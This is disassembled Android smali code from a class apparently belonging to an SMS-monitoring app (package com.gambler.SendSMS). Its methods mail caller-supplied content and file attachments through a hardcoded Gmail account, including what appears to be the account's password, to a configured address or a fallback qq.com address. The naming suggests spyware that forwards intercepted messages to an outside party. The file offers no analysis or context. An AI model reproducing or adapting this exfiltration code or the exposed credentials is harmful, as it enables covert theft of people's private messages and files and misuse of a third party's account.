.class public final Lcom/gambler/SendSMS/k;
.super Ljava/lang/Object;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static a(Ljava/lang/String;)J
    .locals 4

    const-wide/16 v2, 0x0

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    if-gtz v0, :cond_1

    :cond_0
    move-wide v0, v2

    :goto_0
    return-wide v0

    :cond_1
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    goto :goto_0

    :cond_2
    move-wide v0, v2

    goto :goto_0
.end method

.method public static a(La/a/a/h;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    new-instance v0, Lcom/gambler/a/a;

    const-string v1, "jacktomoas@gmail.com"

    const-string v2, "658928"

    invoke-direct {v0, v1, v2}, Lcom/gambler/a/a;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "SMSMonitorEmail"

    invoke-static {v1}, Lcom/gambler/SendSMS/d;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    const-string v1, "33372449@qq.com"

    move-object v4, v1

    :goto_0
    :try_start_0
    const-string v3, "jacktomoas@gmail.com"

    move-object v1, p1

    move-object v2, p2

    move-object v5, p0

    invoke-virtual/range {v0 .. v5}, Lcom/gambler/a/a;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;La/a/a/h;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    return-void

    :catch_0
    move-exception v0

    const-string v1, "SendMail"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_1

    :cond_0
    move-object v4, v1

    goto :goto_0
.end method

.method public static b(Ljava/lang/String;)La/a/a/h;
    .locals 3

    new-instance v0, La/a/a/h;

    invoke-direct {v0}, La/a/a/h;-><init>()V

    new-instance v1, La/b/n;

    invoke-direct {v1, p0}, La/b/n;-><init>(Ljava/lang/String;)V

    new-instance v2, La/b/f;

    invoke-direct {v2, v1}, La/b/f;-><init>(La/b/j;)V

    invoke-virtual {v0, v2}, La/a/a/h;->a(La/b/f;)V

    invoke-virtual {v1}, La/b/n;->c()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, La/a/a/h;->c(Ljava/lang/String;)V

    return-object v0
.end method
